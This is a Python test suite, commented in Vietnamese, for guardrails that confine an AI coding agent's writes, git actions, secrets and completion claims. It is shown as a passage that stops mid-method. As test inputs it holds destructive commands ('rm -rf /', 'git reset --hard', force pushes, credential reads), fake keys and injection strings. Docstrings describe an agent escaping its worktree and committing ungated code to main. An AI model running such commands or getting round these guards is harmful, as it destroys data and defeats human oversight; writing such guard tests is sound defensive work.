"""Kiểm chứng guard — mỗi guard phải CHẶN THẬT ở đúng tình huống."""

from __future__ import annotations

import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from aisef.harness.guardrails import (
    ALLOW,
    ENV_DISALLOWED_TOOLS,
    Verdict,
    record_outcome,
    ENV_WORKDIR,  # noqa: E402
    ENV_STORY_ID,
    ENV_WRITE_SCOPE,
    GUARD_MATCHERS,
    changed_files,
    check_completion,
    check_destructive,
    check_diff_scope,
    effective_scope,
    check_git_stage,
    check_injection,
    check_secrets,
    check_write_scope,
    fork_point,
    run_guard,
    scope_from_env,
    scrub_secrets,
)
from aisef.harness.observe import EvidenceStore  # noqa: E402


class TestWriteScope(unittest.TestCase):
    def test_inside_scope_allowed(self):
        self.assertTrue(check_write_scope("src/api/users.py", ["src/api"]).allowed)

    def test_exact_file_scope(self):
        self.assertTrue(check_write_scope("src/a.py", ["src/a.py"]).allowed)

    def test_outside_scope_blocked(self):
        v = check_write_scope("src/models/user.py", ["src/api"])
        self.assertFalse(v.allowed)
        self.assertEqual(v.exit_code, 2)

    def test_sibling_prefix_is_not_inside(self):
        """`src/apidocs` không nằm trong `src/api`."""
        self.assertFalse(check_write_scope("src/apidocs/x.py", ["src/api"]).allowed)

    def test_empty_scope_blocks(self):
        """Chưa khai phạm vi thì không cho ghi — mặc định mở là guard trang trí."""
        v = check_write_scope("src/a.py", [])
        self.assertFalse(v.allowed)
        self.assertIn("has not declared write_scope", v.reason)

    def test_no_file_path_is_not_a_write(self):
        self.assertTrue(check_write_scope("", ["src"]).allowed)

    def test_multiple_scopes(self):
        scope = ["src/api", "tests"]
        self.assertTrue(check_write_scope("tests/test_api.py", scope).allowed)
        self.assertFalse(check_write_scope("docs/x.md", scope).allowed)

    def test_absolute_path_outside_project_blocked(self):
        v = check_write_scope("/etc/passwd", ["src"], project_root="/tmp/du-an")
        self.assertFalse(v.allowed)
        self.assertIn("outside the project directory", v.reason)

    def test_reason_tells_agent_what_to_do(self):
        """Lý do được chuyển vào kết quả tool cho agent đọc — phải hành động được."""
        v = check_write_scope("x.py", ["src"])
        self.assertIn("write_scope", v.reason)
        self.assertIn("stop and report", v.reason)


class TestDauPhanCachWindows(unittest.TestCase):
    """Lỗi 34. `Path.relative_to` trả về **dạng bản địa**, còn mọi phép so
    sau đó viết bằng `/`. Trên Windows `_bmad-output\\project-context.md` là
    **một** đoạn, không khớp phạm vi nào, nên guard từ chối một tệp rõ ràng
    nằm trong `_bmad-output` và chặn đứng giai đoạn plan (người dùng báo
    2026-09-09, aisef 1.2.19).

    Đặt `_WIN_SEP` thay vì giả lập `os.name`: giả lập `os.name` khiến
    `pathlib` dựng `WindowsPath` và vỡ trên Linux (CI 3.11/3.12).
    """

    def setUp(self):
        import aisef.harness.guardrails as g
        self.g = g
        self._cu = g._WIN_SEP
        g._WIN_SEP = True

    def tearDown(self):
        self.g._WIN_SEP = self._cu

    def test_duong_dan_windows_trong_pham_vi_duoc_cho_qua(self):
        v = check_write_scope(r"_bmad-output\project-context.md", ["_bmad-output", "docs"])
        self.assertTrue(v.allowed, v.reason)

    def test_van_chan_dung_thu_ngoai_pham_vi(self):
        self.assertFalse(check_write_scope(r"src\models\user.py", ["src/api"]).allowed)

    def test_hang_xom_cung_tien_to_van_khong_phai_ben_trong(self):
        self.assertFalse(check_write_scope(r"src\apidocs\x.py", ["src/api"]).allowed)

    def test_diff_scope_doc_duoc_duong_dan_windows(self):
        from aisef.harness.guardrails import check_diff_scope
        self.assertTrue(check_diff_scope([r"_bmad-output\prd.md"], ["_bmad-output"]).allowed)

    def test_posix_khong_doi_hanh_vi(self):
        """Trên POSIX dấu `\\` là ký tự hợp lệ trong tên tệp: đọc nó thành
        ranh giới thư mục sẽ cho `docs\\evil.sh` ở gốc lọt qua như thể nằm
        trong `docs/`."""
        self.g._WIN_SEP = False
        self.assertFalse(check_write_scope(r"docs\evil.sh", ["docs"]).allowed)


class TestSecrets(unittest.TestCase):
    def test_anthropic_key_blocked(self):
        v = check_secrets('KEY = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456"')
        self.assertFalse(v.allowed)
        self.assertIn("Anthropic", v.reason)

    def test_aws_key_blocked(self):
        self.assertFalse(check_secrets('aws = "AKIA2E0KJH4M9QZXPLQR"').allowed)

    def test_aws_documentation_key_is_placeholder(self):
        """Chuỗi ví dụ trong tài liệu AWS mang chữ EXAMPLE — không phải rò rỉ."""
        self.assertTrue(check_secrets('aws = "AKIAIOSFODNN7EXAMPLE"').allowed)

    def test_private_key_blocked(self):
        self.assertFalse(check_secrets("-----BEGIN RSA PRIVATE KEY-----").allowed)

    def test_password_assignment_blocked(self):
        self.assertFalse(check_secrets('password = "sieu-bi-mat-2026"').allowed)

    def test_env_read_allowed(self):
        """Chặn cách làm ĐÚNG sẽ khiến người ta tắt guard đi."""
        self.assertTrue(check_secrets('API_KEY = os.environ["API_KEY"]').allowed)
        self.assertTrue(check_secrets("const k = process.env.API_KEY").allowed)

    def test_placeholder_allowed(self):
        self.assertTrue(check_secrets('password = "your-password-here"').allowed)
        self.assertTrue(check_secrets('key = "${SECRET_KEY}"').allowed)

    def test_reports_line_number(self):
        v = check_secrets('dòng một\ndòng hai\npassword = "that-la-bi-mat"')
        self.assertIn("line 3", v.reason)

    def test_clean_content_allowed(self):
        self.assertTrue(check_secrets("def cong(a, b):\n    return a + b\n").allowed)

    def test_scrub_che_va_dem(self):
        """ADR-005 V1: che thay vì chặn — cho bằng chứng đã sinh, không phải mã sắp ghi."""
        text, n = scrub_secrets(
            "a\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
            "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.abcdefghijklmnop\nb")
        self.assertEqual(n, 2)
        self.assertEqual(text.count("[REDACTED]"), 2)
        self.assertNotIn("wJalr", text)
        self.assertNotIn("eyJhbGci", text)

    def test_scrub_khong_bo_qua_dong_giu_cho(self):
        """Khác `check_secrets`: che nhầm ví dụ là vô hại, bỏ sót khoá thật thì
        nó đã nằm trong lịch sử git."""
        self.assertEqual(scrub_secrets('password = "your-password-here-1"')[1], 1)

    def test_scrub_sach_thi_nguyen_ven(self):
        self.assertEqual(scrub_secrets("def cong(a, b):\n    return a + b\n"),
                         ("def cong(a, b):\n    return a + b\n", 0))


class TestGitStage(unittest.TestCase):
    def test_add_all_blocked(self):
        self.assertFalse(check_git_stage("git add -A").allowed)

    def test_add_dot_blocked(self):
        self.assertFalse(check_git_stage("git add .").allowed)

    def test_add_all_long_flag_blocked(self):
        self.assertFalse(check_git_stage("git add --all").allowed)

    def test_specific_paths_allowed(self):
        self.assertTrue(check_git_stage("git add src/api/users.py tests/test_users.py").allowed)

    def test_add_dot_inside_path_allowed(self):
        self.assertTrue(check_git_stage("git add src/a.py").allowed)

    def test_reason_shows_correct_usage(self):
        self.assertIn("git add src/", check_git_stage("git add -A").reason)


class TestDestructive(unittest.TestCase):
    def test_reset_hard_blocked(self):
        self.assertFalse(check_destructive("git reset --hard HEAD~1").allowed)

    def test_checkout_discard_blocked(self):
        self.assertFalse(check_destructive("git checkout -- .").allowed)

    def test_force_push_blocked(self):
        self.assertFalse(check_destructive("git push --force origin main").allowed)

    def test_rm_rf_blocked(self):
        self.assertFalse(check_destructive("rm -rf build/").allowed)

    def test_stash_drop_blocked(self):
        self.assertFalse(check_destructive("git stash drop").allowed)

    def test_normal_commands_allowed(self):
        for cmd in ("git status", "git commit -m 'FR-01: x'", "pytest", "rm build/tmp.txt",
                    "git commit -m 'push notification'", "git remote -v", "git remote show origin",
                    "git fetch origin", "git log --oneline", "git config user.name"):
            with self.subTest(cmd=cmd):
                self.assertTrue(check_destructive(cmd).allowed)

    def test_git_push_moi_dang_bi_chan_ke_ca_dry_run(self):
        """ADR-005 V2: push/merge là việc của harness sau cổng, không phải của
        agent — kể cả `--dry-run` (vẫn xác thực với remote)."""
        for cmd in ("git push", "git push origin HEAD", "git push --dry-run", "git push -u origin story/x",
                    "git -C w push", "git --no-pager push origin main", "cd w && git push origin HEAD",
                    "git -c credential.helper=osxkeychain push origin main"):
            with self.subTest(cmd=cmd):
                v = check_destructive(cmd)
                self.assertFalse(v.allowed)
                self.assertIn("harness", v.reason)

    def test_git_remote_va_credential_bi_chan(self):
        for cmd in ("git remote add origin https://x/y.git", "git remote set-url origin git@x:y.git",
                    "git credential fill", "git credential-osxkeychain get",
                    "git -c credential.helper=store fetch origin", "git -C w -c credential.helper= fetch"):
            with self.subTest(cmd=cmd):
                self.assertFalse(check_destructive(cmd).allowed)


class TestInjection(unittest.TestCase):
    def test_fstring_sql_blocked(self):
        code = 'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")'
        self.assertFalse(check_injection(code).allowed)

    def test_parameterised_sql_allowed(self):
        code = 'cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))'
        self.assertTrue(check_injection(code).allowed)

    def test_dangerous_html_blocked(self):
        self.assertFalse(check_injection("<div dangerouslySetInnerHTML={{__html: x}} />").allowed)

    def test_shell_concat_blocked(self):
        self.assertFalse(check_injection('os.system(f"rm {path}")').allowed)

    def test_subprocess_list_allowed(self):
        self.assertTrue(check_injection('subprocess.run(["rm", path])').allowed)

    def test_no_ts_thi_guard_cung_phai_no(self):
        """Guard chỉ biết mẫu Python thì trên dự án TypeScript nó có mặt mà
        không bao giờ nổ — và báo cáo vẫn ghi "7 guard đã nối".
        """
        for code in (
            "execSync(`rm -rf ${dir}`)",
            "exec(`git checkout ${branch}`)",
            'child_process.exec("ls " + dir)',
            "spawn(`sh -c ${cmd}`)",
            "db.query(`SELECT * FROM notes WHERE id = ${id}`)",
            "knex.raw(`select * from t where a=${a}`)",
            'conn.execute("DELETE FROM t WHERE k=" + k)',
            "el.outerHTML = user",
            'el.insertAdjacentHTML("beforeend", html)',
            "document.write(x)",
            "eval(`return ${expr}`)",
            "new Function(`return ${e}`)",
        ):
            with self.subTest(code=code):
                self.assertFalse(check_injection(code).allowed)

    def test_ts_dung_dan_khong_bi_chan_oan(self):
        """Chặn oan đắt ngang bỏ sót: mỗi lần chặn tốn nguyên một lượt model.

        `execFileSync` với đối số dạng mảng là dạng **an toàn** — nó không
        đi qua shell. Mẫu gộp chung hai họ ngôn ngữ chặn đúng nó, vì `{`
        của object tuỳ chọn bị đọc thành nội suy f-string.
        """
        for code in (
            r"const m = /^(\w+)-(\d+)$/.exec(id)",
            "if (RE_TAG.exec(line)) return true",
            'execFileSync("git", ["ls-files", "--", "package-lock.json"], { cwd: root })',
            'execFileSync("npx", ["vite", "build", "--outDir", out], { stdio: "inherit" })',
            'const rows = await db.query("SELECT * FROM notes WHERE id = $1", [id])',
            "const q = sql`select * from notes where id = ${id}`",
            "console.log(`đã lưu ${n} ghi chú`)",
            "const p = spawn(cmd, args)",
            "el.textContent = user",
            'const cls = `flex ${active ? "on" : "off"}`',
        ):
            with self.subTest(code=code):
                self.assertTrue(check_injection(code).allowed, code)


class TestChangedFilesBase(unittest.TestCase):
    """Agent tự commit thì cổng vẫn phải thấy công việc.

    Thiết kế khuyến khích agent commit từng phần — merge chỉ thấy thứ đã
    commit. Nhưng ba cổng (phạm vi ghi, test-thật, rà soát) cùng đọc
    `changed_files`; so với HEAD thì sau commit chúng thấy rỗng và cùng
    lúc mất tác dụng.
    """

    def repo(self, tmp: str) -> Path:
        d = Path(tmp)
        subprocess.run(["git", "init", "-q"], cwd=d, check=True)
        subprocess.run(["git", "config", "user.email", "t@t"], cwd=d, check=True)
        subprocess.run(["git", "config", "user.name", "t"], cwd=d, check=True)
        (d / "goc.txt").write_text("goc", encoding="utf-8")
        subprocess.run(["git", "add", "goc.txt"], cwd=d, check=True)
        subprocess.run(["git", "commit", "-qm", "goc"], cwd=d, check=True)
        return d

    def test_commit_cua_agent_van_nam_trong_tam_nhin(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self.repo(tmp)
            base = subprocess.run(
                ["git", "rev-parse", "HEAD"], cwd=d,
                capture_output=True, text=True, check=True,
            ).stdout.strip()

            (d / "src").mkdir()
            (d / "src" / "moi.py").write_text("x = 1", encoding="utf-8")
            subprocess.run(["git", "add", "src/moi.py"], cwd=d, check=True)
            subprocess.run(["git", "commit", "-qm", "agent tu commit"], cwd=d, check=True)

            self.assertEqual(changed_files(str(d)), [], "so với HEAD: mù")
            self.assertEqual(changed_files(str(d), base_ref=base), ["src/moi.py"])

    def test_khong_trung_lap_khi_vua_commit_vua_con_do(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self.repo(tmp)
            base = subprocess.run(
                ["git", "rev-parse", "HEAD"], cwd=d,
                capture_output=True, text=True, check=True,
            ).stdout.strip()
            (d / "a.py").write_text("a", encoding="utf-8")
            subprocess.run(["git", "add", "a.py"], cwd=d, check=True)
            subprocess.run(["git", "commit", "-qm", "a"], cwd=d, check=True)
            (d / "a.py").write_text("a sua tiep", encoding="utf-8")  # commit rồi sửa tiếp
            (d / "b.py").write_text("b", encoding="utf-8")  # chưa theo dõi

            got = changed_files(str(d), base_ref=base)
            self.assertEqual(sorted(got), ["a.py", "b.py"])

    def test_fork_point_khong_tinh_cong_viec_story_khac(self):
        """Story trước merge vào nhánh chính giữa lúc story sau đang chạy:
        so với đầu nhánh thì công việc story trước bị tính sang story sau.
        """
        with tempfile.TemporaryDirectory() as tmp:
            d = self.repo(tmp)
            main = subprocess.run(
                ["git", "rev-parse", "--abbrev-ref", "HEAD"], cwd=d,
                capture_output=True, text=True, check=True,
            ).stdout.strip()
            subprocess.run(["git", "checkout", "-qb", "story/b"], cwd=d, check=True)
            (d / "cua-b.py").write_text("b", encoding="utf-8")
            subprocess.run(["git", "add", "cua-b.py"], cwd=d, check=True)
            subprocess.run(["git", "commit", "-qm", "b"], cwd=d, check=True)

            # story A merge vào nhánh chính sau khi B đã rẽ
            subprocess.run(["git", "checkout", "-q", main], cwd=d, check=True)
            (d / "cua-a.py").write_text("a", encoding="utf-8")
            subprocess.run(["git", "add", "cua-a.py"], cwd=d, check=True)
            subprocess.run(["git", "commit", "-qm", "a"], cwd=d, check=True)
            subprocess.run(["git", "checkout", "-q", "story/b"], cwd=d, check=True)

            base = fork_point(str(d), main)
            self.assertTrue(base)
            self.assertEqual(changed_files(str(d), base_ref=base), ["cua-b.py"])


class TestDispatch(unittest.TestCase):
    def event(self, **tool_input):
        return {"tool_name": "Write", "tool_input": tool_input}

    def test_write_scope_via_env(self):
        env = {ENV_WRITE_SCOPE: "src/api, tests"}
        self.assertEqual(scope_from_env(env), ["src/api", "tests"])
        v = run_guard("write-scope", self.event(file_path="src/api/x.py"), env=env)
        self.assertTrue(v.allowed)

    def test_secret_via_dispatch(self):
        v = run_guard("secret", self.event(content='k = "sk-ant-api03-' + "a" * 30 + '"'))
        self.assertFalse(v.allowed)

    def test_bash_guards_read_command(self):
        self.assertFalse(run_guard("git-stage", {"tool_input": {"command": "git add -A"}}).allowed)
        self.assertFalse(
            run_guard("destructive", {"tool_input": {"command": "rm -rf /"}}).allowed
        )

    def test_edit_new_string_is_checked(self):
        v = run_guard("secret", {"tool_input": {"new_string": 'pw = "that-la-bi-mat-that"'}})
        self.assertFalse(v.allowed)

    def test_unknown_guard_raises(self):
        with self.assertRaises(ValueError):
            run_guard("khong-co", {})

    def test_empty_event_is_allowed(self):
        """Guard tiền kiểm đọc *sự kiện*: sự kiện rỗng thì không có gì để
        chặn. Hai guard `diff-scope` và `completion` không đọc sự kiện mà
        đọc trạng thái (cây git, bằng chứng), nên không thuộc luật này."""
        for kind, (event, _) in GUARD_MATCHERS.items():
            if event != "PreToolUse":
                continue
            with self.subTest(guard=kind):
                self.assertTrue(run_guard(kind, {}, env={ENV_WRITE_SCOPE: "src"}).allowed)

    def test_diff_scope_soi_cay_agent_dang_dung(self):
        """`cwd` của sự kiện thắng `--project`.

        Hook nằm trong `.claude/settings.json`, biên dịch một lần với
        `--project` là gốc dự án; nhưng story chạy trong worktree riêng.
        Lấy gốc dự án thì guard đọc `git status` của cây khác — thấy tài
        liệu kế hoạch chưa commit và chặn mọi lệnh Bash của agent.
        """
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "du-an"
            work = Path(tmp) / "worktree"
            for d in (root, work):
                d.mkdir()
                subprocess.run(["git", "init", "-q"], cwd=d, check=True)
            # Gốc dự án bẩn: tài liệu kế hoạch chưa commit.
            (root / "prd.md").write_text("ngoai pham vi", encoding="utf-8")
            # Worktree sạch trong phạm vi story.
            (work / "src").mkdir()
            (work / "src" / "x.py").write_text("x = 1", encoding="utf-8")

            env = {ENV_WRITE_SCOPE: "src"}
            event = {"tool_input": {"command": "ls"}, "cwd": str(work)}
            self.assertTrue(
                run_guard("diff-scope", event, env=env, project_root=str(root)).allowed
            )
            # Không có `cwd` thì mới lùi về `--project` — và chặn đúng.
            self.assertFalse(
                run_guard("diff-scope", {"tool_input": {}}, env=env,
                          project_root=str(root)).allowed
            )

    def test_every_guard_has_a_matcher(self):
        for kind in ("write-scope", "secret", "injection", "git-stage", "destructive"):
            self.assertIn(kind, GUARD_MATCHERS)

    def test_exit_code_convention(self):
        """Claude Code coi mã 2 là chặn (kiểm chứng ở spike S2)."""
        self.assertEqual(run_guard("git-stage", {"tool_input": {"command": "git add -A"}}).exit_code, 2)
        self.assertEqual(run_guard("git-stage", {"tool_input": {"command": "git status"}}).exit_code, 0)


class TestEffectiveScope(unittest.TestCase):
    """Ngoài story vẫn phải có phạm vi — nếu không, guard chặn cả BMAD ghi
    PRD, và cách duy nhất để chạy tiếp là tắt guard ở nửa đầu vòng đời."""

    def test_planning_scope_when_no_story(self):
        scope = effective_scope({})
        self.assertIn("_bmad-output", scope)
        self.assertTrue(check_write_scope("_bmad-output/prd.md", scope).allowed)

    def test_planning_scope_still_blocks_source_code(self):
        self.assertFalse(
            check_write_scope("src/app.ts", effective_scope({})).allowed
        )

    def test_story_without_declared_scope_still_blocks(self):
        """Quên truyền biến môi trường không được biến guard thành đồ
        trang trí."""
        scope = effective_scope({ENV_STORY_ID: "S-01"})
        self.assertEqual(scope, [])
        self.assertFalse(check_write_scope("_bmad-output/prd.md", scope).allowed)

    def test_declared_scope_wins(self):
        self.assertEqual(
            effective_scope({ENV_WRITE_SCOPE: "src/a, src/b"}), ["src/a", "src/b"]
        )


class TestDiffScope(unittest.TestCase):
    """Guard hậu kiểm: đọc *kết quả* trên cây làm việc, không đọc ý định.

    Đây là guard duy nhất còn hiệu lực khi client không gắn được hook tiền
    kiểm (OpenCode ở mức hậu kiểm) — nó bắt cả đường đi vòng: script tự
    sinh file, lệnh di chuyển file.
    """

    def test_all_inside_scope(self):
        self.assertTrue(check_diff_scope(["src/api/a.py", "src/api/b.py"], ["src/api"]).allowed)

    def test_file_outside_scope_blocks(self):
        v = check_diff_scope(["src/api/a.py", "src/web/x.ts"], ["src/api"])
        self.assertFalse(v.allowed)
        self.assertIn("src/web/x.ts", v.reason)

    def test_path_segment_not_string_prefix(self):
        """`src/apidocs` không nằm trong `src/api`."""
        self.assertFalse(check_diff_scope(["src/apidocs/x.md"], ["src/api"]).allowed)

    def test_nothing_changed_is_allowed(self):
        self.assertTrue(check_diff_scope([], []).allowed)

    def test_changes_without_declared_scope_block(self):
        self.assertFalse(check_diff_scope(["a.py"], []).allowed)

    def test_harness_own_files_are_not_the_story_writing_out_of_scope(self):
        """Ghi bằng chứng là việc của harness. Tính nó vào diff của story
        thì guard tự tố cáo chính mình, và mọi story đều trượt."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            subprocess.run(["git", "init", "-q"], cwd=root, check=True)
            (root / "src").mkdir()
            (root / "src" / "a.py").write_text("x = 1\n", encoding="utf-8")
            ev = root / "_bmad-output" / "evidence"
            ev.mkdir(parents=True)
            (ev / "STORY-01-01.jsonl").write_text("{}\n", encoding="utf-8")
            changed = changed_files(str(root))
            self.assertIn("src/a.py", changed)
            self.assertTrue(check_diff_scope(changed, ["src"]).allowed)

    def test_installed_dependencies_are_not_the_story_writing_out_of_scope(self):
        """`node_modules` xuất hiện vì story **chạy**, không phải vì story
        **viết**. Tính vào phạm vi thì mọi story cài phụ thuộc đều trượt, và
        cách duy nhất chạy tiếp là nới phạm vi đến mức guard hết nghĩa."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            subprocess.run(["git", "init", "-q"], cwd=root, check=True)
            (root / "src").mkdir()
            (root / "src" / "a.ts").write_text("export const x = 1\n", encoding="utf-8")
            deep = root / "node_modules" / "react" / "lib"
            deep.mkdir(parents=True)
            (deep / "index.js").write_text("module.exports = {}\n", encoding="utf-8")
            (root / "dist").mkdir()
            (root / "dist" / "bundle.js").write_text("//\n", encoding="utf-8")

            changed = changed_files(str(root))
            self.assertEqual(changed, ["src/a.ts"])
            self.assertTrue(check_diff_scope(changed, ["src"]).allowed)

    def test_tool_artifacts_are_not_the_story_writing_out_of_scope(self):
        """Agent mở trình duyệt để xem trang thì Playwright MCP để lại
        `.playwright-mcp/` ở gốc. Tính vào phạm vi thì mở trình duyệt một
        lần là trượt cổng."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            subprocess.run(["git", "init", "-q"], cwd=root, check=True)
            (root / "src").mkdir()
            (root / "src" / "a.ts").write_text("export const x = 1\n", encoding="utf-8")
            shot = root / ".playwright-mcp"
            shot.mkdir()
            (shot / "page.png").write_bytes(b"x")
            changed = changed_files(str(root))
            self.assertEqual(changed, ["src/a.ts"])

    def test_agent_editing_the_prd_still_shows_up(self):
        """Chỉ phần harness tự ghi được miễn; sửa PRD giữa lúc viết code là
        chuyện phải lộ ra."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            subprocess.run(["git", "init", "-q"], cwd=root, check=True)
            (root / "_bmad-output").mkdir()
            (root / "_bmad-output" / "prd.md").write_text("sửa trộm\n", encoding="utf-8")
            self.assertIn("_bmad-output/prd.md", changed_files(str(root)))

    def test_reads_real_git_status(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            subprocess.run(["git", "init", "-q"], cwd=root, check=True)
            (root / "src").mkdir()
            (root / "src" / "a.py").write_text("x = 1\n", encoding="utf-8")
            (root / "ngoai-pham-vi.txt").write_text("x\n", encoding="utf-8")
            changed = changed_files(str(root))
            self.assertIn("src/a.py", changed)
            self.assertIn("ngoai-pham-vi.txt", changed)
            self.assertFalse(check_diff_scope(changed, ["src"]).allowed)


class TestCompletion(unittest.TestCase):
    """Guard chốt chặn cuối: không cho tuyên bố xong khi test chưa xanh."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.store = EvidenceStore(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def verdict(self):
        return check_completion(self.store.read("S-01"))

    def test_never_ran_tests(self):
        v = self.verdict()
        self.assertFalse(v.allowed)
        self.assertIn("no test run recorded", v.reason)

    def test_unconfigured_test_command_does_not_trap_the_agent(self):
        """Dự án chưa khai lệnh test: `tool test` ghi ok=False + skipped.
        Đó không phải "đỏ" — chặn Stop thì agent kẹt đến hết lượt (đo ở
        hợp quy C2/C3). Cho dừng; cổng story tự ghi "chưa cấu hình"."""
        self.store.tool_run("S-01", "test", ok=False,
                            detail={"skipped": "dự án chưa khai lệnh cho tool này"})
        self.assertTrue(self.verdict().allowed)
        # Còn đỏ thật thì vẫn chặn.
        self.store.tool_run("S-01", "test", ok=False, detail={"tail": "1 failed"})
        self.assertFalse(self.verdict().allowed)

    def test_the_instruction_is_a_command_that_actually_runs(self):
        """Guard chặn bằng một chỉ dẫn không chạy được thì agent kẹt: nó
        không dừng được, cũng không làm được điều được bảo, và cứ thế đốt
        hết số lượt."""
        import os

        from aisef.harness.tools import aisef_command

        binary = aisef_command()
        self.assertIn(f"{binary} tool test", self.verdict().reason)
        if binary != "aisef":
            self.assertTrue(os.access(binary, os.X_OK))

    def test_stale_message_also_names_the_command(self):
        self.store.tool_run("S-01", "test", ok=True)
        self.store.file_change("S-01", "src/b.py")
        from aisef.harness.tools import aisef_command

        self.assertIn(f"{aisef_command()} tool test", self.verdict().reason)

    def test_last_run_red(self):
        self.store.tool_run("S-01", "test", ok=False, detail={"tail": "2 failed"})
        v = self.verdict()
        self.assertFalse(v.allowed)
        self.assertIn("2 failed", v.reason)

    def test_green_and_nothing_touched_after(self):
        self.store.file_change("S-01", "src/a.py")
        self.store.tool_run("S-01", "test", ok=True)
        self.assertTrue(self.verdict().allowed)

    def test_code_touched_after_the_green_run(self):
        """Kiểu "xanh" hay gặp nhất khi agent vội: xanh trước, sửa sau."""
        self.store.tool_run("S-01", "test", ok=True)
        self.store.file_change("S-01", "src/b.py")
        v = self.verdict()
        self.assertFalse(v.allowed)
        self.assertIn("src/b.py", v.reason)

    def test_outside_a_story_the_guard_stays_out_of_the_way(self):
        """Không biết story nào thì không kết luận được — chặn ở đây sẽ chặn
        cả những lượt chạy ngoài vòng đời story."""
        v = run_guard("completion", {}, env={}, artifact_root=self._tmp.name)
        self.assertTrue(v.allowed)

    def test_runs_through_run_guard_with_story_env(self):
        v = run_guard(
            "completion",
            {},
            env={ENV_STORY_ID: "S-01"},
            artifact_root=self._tmp.name,
        )
        self.assertFalse(v.allowed)


if __name__ == "__main__":
    unittest.main(verbosity=2)


class TestThoatKhoiCayLamViec(unittest.TestCase):
    """Lỗi 40. Tool `bash` của OpenCode nhận `workdir` riêng cho **từng
    lệnh**, và model tự đặt nó.

    Bản ghi phiên của lượt hỏng:

        {"tool":"bash","state":{"input":{
           "command":"git add \"src/reverse-words.js\" … && git commit -m …",
           "workdir":"/…/scratchpad/par"}}}

    `workdir` là gốc dự án, không phải worktree của story. Nên công việc
    rơi thẳng lên `main`: worktree vẫn trống, diff rỗng, story trượt vì lý
    do sai, còn code chưa qua cổng nào thì đã nằm trên thân cây.
    """

    def guard(self, kind, *, cwd="/tmp/cay", **ti):
        return run_guard(kind, {"cwd": cwd, "tool_name": "bash",
                                "tool_input": {"command": "ls", **ti}})

    def test_chan_khi_workdir_ra_ngoai_cay(self):
        v = self.guard("git-stage", workdir="/tmp/noi-khac")
        self.assertFalse(v.allowed)
        self.assertIn("outside the working tree", v.reason)

    def test_chan_ca_khi_ra_gocdu_an_la_cha_cua_cay(self):
        """Gốc dự án là **cha** của worktree — đúng ca đã gặp thật."""
        v = self.guard("destructive", cwd="/tmp/par/.aisef/worktrees/S1",
                       workdir="/tmp/par")
        self.assertFalse(v.allowed)

    def test_cho_di_xuong_thu_muc_con(self):
        self.assertTrue(self.guard("git-stage", workdir="/tmp/cay/src").allowed)

    def test_chinh_cay_do_thi_cho(self):
        self.assertTrue(self.guard("git-stage", workdir="/tmp/cay").allowed)

    def test_khong_khai_workdir_thi_khong_noi_gi(self):
        """Claude Code không có tham số này — guard phải im lặng."""
        self.assertTrue(self.guard("git-stage").allowed)

    def test_ap_cho_moi_guard_khong_chi_mot_cai(self):
        """Đặt ở tầng điều phối nên guard nào chạy trước cũng chặn được."""
        for kind in ("write-scope", "secret", "injection", "git-stage",
                     "destructive"):
            with self.subTest(guard=kind):
                self.assertFalse(
                    self.guard(kind, workdir="/tmp/noi-khac").allowed, kind)

    def test_ban_khai_cua_harness_thang_loi_khai_cua_client(self):
        """Client có thể báo **gốc dự án** thay vì worktree — OpenCode làm
        đúng thế. Harness thì biết chắc: chính nó dựng worktree.

        Không có thứ tự tin cậy này thì `cwd` do client gửi là gốc dự án,
        `workdir` model tự đặt cũng là gốc dự án, hai cái bằng nhau, và
        guard kết luận "không có gì thoát ra" trong khi công việc đang rơi
        thẳng lên thân cây.
        """
        v = run_guard(
            "git-stage",
            {"cwd": "/tmp/par", "tool_name": "bash",
             "tool_input": {"command": "git commit -m x", "workdir": "/tmp/par"}},
            env={ENV_WORKDIR: "/tmp/par/.aisef/worktrees/S1"},
        )
        self.assertFalse(v.allowed)
        self.assertIn("/tmp/par/.aisef/worktrees/S1", v.reason)

    def test_khong_khai_thi_lui_ve_loi_client(self):
        v = run_guard("git-stage", {
            "cwd": "/tmp/cay", "tool_name": "bash",
            "tool_input": {"command": "ls", "workdir": "/tmp/noi-khac"}}, env={})
        self.assertFalse(v.allowed)
        self.assertIn("/tmp/cay", v.reason)

    def test_client_goi_tham_so_do_la_cwd_thi_van_bat(self):
        """Không phải client nào cũng đặt tên `workdir`."""
        v = run_guard("git-stage", {
            "cwd": "/tmp/cay", "tool_name": "bash",
            "tool_input": {"command": "ls", "cwd": "/tmp/noi-khac"},
        })
        self.assertFalse(v.allowed)


class TestCamToolTheoVai(unittest.TestCase):
    """Người rà soát mà sửa được code thì nó thành lượt viết thứ hai.

    Claude Code có `--disallowed-tools`. OpenCode khai `TOOL_ALLOWLIST:
    EMULATED "qua permission config"` — nhưng không có mã nào sinh config
    ấy, nên người rà soát trên OpenCode **ghi được**. Cấm ở guard thì mọi
    client đều cấm, và Claude có thêm một lớp phòng khi cờ bị bỏ quên.
    """

    def guard(self, tool, kind="write-scope", env=None):
        return run_guard(kind, {
            "cwd": "/tmp/cay", "tool_name": tool,
            "tool_input": {"file_path": "/tmp/cay/src/a.py", "content": "x"},
        }, env=env if env is not None else {
            ENV_DISALLOWED_TOOLS: "Write,Edit,NotebookEdit",
            ENV_WRITE_SCOPE: "src",
        })

    def test_vai_ra_soat_khong_duoc_ghi(self):
        v = self.guard("Write")
        self.assertFalse(v.allowed)
        self.assertIn("not allowed to use tool Write", v.reason)

    def test_ten_tool_viet_thuong_cua_opencode_cung_bi_cam(self):
        self.assertFalse(self.guard("write").allowed)
        self.assertFalse(self.guard("edit").allowed)

    def test_tool_doc_van_duoc(self):
